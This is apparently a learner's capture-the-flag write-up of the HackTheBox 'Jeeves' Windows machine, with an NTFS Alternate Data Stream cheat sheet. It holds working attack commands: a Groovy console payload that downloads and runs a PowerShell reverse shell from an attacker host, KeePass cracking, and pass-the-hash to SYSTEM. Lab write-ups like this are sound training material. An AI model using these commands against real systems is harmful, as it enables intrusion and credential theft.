

**Box:** Jeeves (Windows) · **IP used:** 10.129.228.112
**Chain:** nmap → fuzz a high port → unauth Jenkins → Groovy RCE → KeePass loot → pass-the-hash → hidden ADS root flag

> My honest notes to myself are in the **"what I learned"** boxes. Read those — that's the actual lesson, not the commands.

---

## Phase 1 — Enumerate

Full port scan first (never just the top 1000):

```bash
nmap -p- --min-rate 5000 10.129.228.112
```

Then version/script scan on what's open:

```bash
nmap -sCV -p 80,135,445,50000 10.129.228.112
```

What came back:
- **80** — IIS, an "Ask Jeeves" search page
- **135 / 445** — RPC / SMB
- **50000** — Jetty (a Java web server)

### Phase 1a — Port 80 was a dead end

I fuzzed the normal website on port 80 and got **nothing useful** (tried burp suite, iis version exploits if any, jenkin exploits if any , felt like a noob, well i am still)— the search box just returns an error image. It's a **rabbit hole**. Don't waste time there.

```bash
gobuster dir -u http://10.129.228.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,html,txt -t 50
```

> **What I learned #1:** I saw port **50000** in the nmap output, but I didn't realise **you can fuzz a port other than 80/443**. A web server can live on *any* port. If nmap shows a web service on a weird port (50000, 8080, 8000, 8443...), you fuzz **that** too — `http://IP:PORT/FUZZ`. The default web page isn't the only web page on the box.

### Phase 1b — Fuzz the high port (this was the way in)
So I pointed the fuzzer at **IP:50000**:

```bash
gobuster dir -u http://10.129.228.112:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

That found **`/askjeeves`** → an **unauthenticated Jenkins** instance. No login needed. That's the foothold.

> **What I learned #2:** My first fuzz didn't show the **`/script`** sub-page — because gobuster only finds the *top-level* folders in the wordlist. `/askjeeves` is the app; `/script` is a **known Jenkins feature path** *inside* it, not something a wordlist hands you. The skill is: once you know **what the app is** (Jenkins), you look up *that app's* dangerous endpoints. For Jenkins that's the **Script Console** at `/script`. Recognising the software > brute-forcing every path.

---

## Phase 2 — Jenkins → RCE (foothold)

Unauthenticated Jenkins = free code execution through the **Groovy Script Console**.

Open: `http://10.129.228.112:50000/askjeeves/script`

Start a listener on the attack box:

```bash
nc -lvnp 4444
```

In the Script Console, make Jenkins pull and run a PowerShell reverse shell (host `shell.ps1` — e.g. Nishang `Invoke-PowerShellTcp` — on a python web server first):

```groovy
cmd = """powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.249/shell.ps1')" """
println cmd.execute().text
```

Shell lands as **jeeves\kohsuke** (the Jenkins service account).

> **What I learned #3:** The shell I caught is a **Windows PowerShell** shell, so the Linux `python -c 'import pty...'` upgrade trick does **nothing** — Jeeves has no Python. On Windows you don't "upgrade with pty"; the shell you get is already usable. If you want a nicer one, that's Meterpreter, not pty.

User flag:

```powershell
type C:\Users\kohsuke\Desktop\user.txt
```

---

## Phase 3 — Loot the KeePass database

In kohsuke's Documents there's a **`CEH.kdbx`** — a KeePass password vault.

```powershell
dir C:\Users\kohsuke\Documents
```

Get it back to the attack box. The **base64 copy-paste** method never fails (the file is tiny):

On Jeeves:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\kohsuke\Documents\CEH.kdbx"))
```

On attack box (I saved it as `pp`):

```bash
echo 'PASTE_THE_BASE64' | base64 -d > pp
```
```bash
file pp
```

(should say "Keepass password database")

> **What I learned #4:** `impacket-smbserver` threw **"Address already in use"** — that just means I already had an smbserver running in another tab (port 445 taken). Not a bug. Fix = kill the old one (`sudo ss -lptn 'sport = :445'` then `kill`), or just use base64 and skip ports entirely.

---

## Phase 4 — Crack & open the vault

Crack the master password offline (KeePass = hashcat mode **13400**):

```bash
keepass2john pp > keepass.hash
```
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```
Master password = **`moonshine1`**.

Open it and read entries. `keepassxc-cli` (from the **apt** package `keepassxc`, not pip):

List entries:

```bash
keepassxc-cli ls pp
```

Open once, browse many (asks password only once):

```bash
keepassxc-cli open pp
```

Show one entry with secrets revealed (`-s`):

```bash
keepassxc-cli show -s pp "Backup stuff"
```

> **What I learned #5 (syntax):** `keepassxc-cli <command> [options] <DATABASE> "<entry>"` — the **database comes first**, and entry names with spaces **must be quoted** (`"Backup stuff"`), or the shell splits them and it looks for a DB called "Jenkins". Also, the CLI re-opens the DB every command, so it asks the password every time — use `keepassxc-cli open pp` to unlock once.

The **"Backup stuff"** entry holds an **NTLM hash**, not a password:
`aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

---

## Phase 5 — Pass-the-Hash → Administrator

What I learned #6 (whose hash?): A raw hash has no username on it. You guess from context (entry = "Backup stuff" → a privileged/backup account → likely Administrator) and then test it by PtH-spraying with nxc:

```bash
nxc smb 10.129.228.112 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
```
(Pwn3d!) on a username = that's whose hash it is. The vault entry name is a hint, not proof.

What I learned #7 (why psexec, not winrm?): nxc showed Pwn3d! on SMB but nothing on WinRM/RDP — because WinRM/RDP services simply aren't running on Jeeves, not because my rights are bad. psexec/wmiexec/smbexec all run over SMB (445), so SMB admin is exactly what they need. Match the exec tool to the pwned protocol: SMB → psexec; WinRM → evil-winrm.

Pass the hash:

```bash
impacket-psexec Administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
Lands as **NT AUTHORITY\SYSTEM**.

> **What I learned #8 (full hash or just NT?):** nxc `-H` takes just the **NT** hash. impacket `-hashes` wants the **`LM:NT`** shape (keep the colon). The `aad3b4...` part is just the *empty LM hash* placeholder — `:e0fb1fb8...` works the same because only the NT half is actually used.

---

## Phase 6 — The hidden root flag (the twist)

`root.txt` isn't a normal file. On the Administrator Desktop, `hm.txt` says the flag is elsewhere. It's hidden in an **NTFS Alternate Data Stream (ADS)**.

Reveal streams (`/r` — normal `dir` hides them):

```cmd
dir /r C:\Users\Administrator\Desktop
```

You'll see `hm.txt:root.txt:$DATA`. Read the stream:

```cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

> **What I learned #9 (why `more <`?):** `type hm.txt:root.txt` **fails** — cmd's `type` can't open a `file:stream`. `more < file:stream` redirects the stream's bytes into `more` as input, so it prints. In PowerShell the clean way is `Get-Content hm.txt -Stream root.txt`.

---

## The 9 takeaways (the real writeup)

1. A web service can be on **any port** — fuzz weird ports (50000), not just 80.
2. Identify the **app** (Jenkins), then look up *its* dangerous paths (`/script`) — wordlists won't hand you those.
3. Windows shells don't take the Linux **pty** upgrade; no Python on the box.
4. "Address already in use" = a server's already running, not broken. **base64** beats SMB for tiny files.
5. KeePass `.kdbx` → `keepass2john` + hashcat **mode 13400**.
6. `keepassxc-cli` syntax: **DB first**, quote names with spaces, `open` to unlock once.
7. A **hash in a vault** = **pass-the-hash, don't crack**; spray with nxc to learn whose it is.
8. `Pwn3d!` on **SMB** → **psexec** (WinRM/RDP may just be off).
9. Flag "not there" → `dir /r` for **Alternate Data Streams**.


---
---

# NTFS Alternate Data Streams (ADS) — quick reference

**What it is:** NTFS lets a file carry hidden extra "streams" of data glued onto it. A file can look tiny/empty but hide a whole second file inside a named stream. Syntax: `filename:streamname`. Classic HTB trick for hiding flags (e.g. Jeeves root flag).

## Spot them
Normal `dir` HIDES streams. Use `/r` to reveal:

```cmd
dir /r C:\Users\Administrator\Desktop
```
Look for lines like `  34 hm.txt:root.txt:$DATA` — that `:root.txt` is the hidden stream.

PowerShell equivalent:
```powershell
Get-Item -Path C:\Users\Administrator\Desktop\* -Stream *
```

## Read them
cmd (`type` FAILS on streams — use redirect into `more`):

```cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

PowerShell (the clean way):

```powershell
Get-Content C:\Users\Administrator\Desktop\hm.txt -Stream root.txt
```

## Write one (for your own notes / red-team)

```cmd
echo secretdata > visible.txt:hidden.txt
```

## Why this matters

When a flag "isn't where it should be" (a `hm.txt` / note says look elsewhere), think **ADS**: run `dir /r`, then `more <` or `Get-Content -Stream`. Also used by malware to hide payloads behind innocent files.

**Memory hook:** flag missing + a taunting note = `dir /r` → `more < file:stream`.

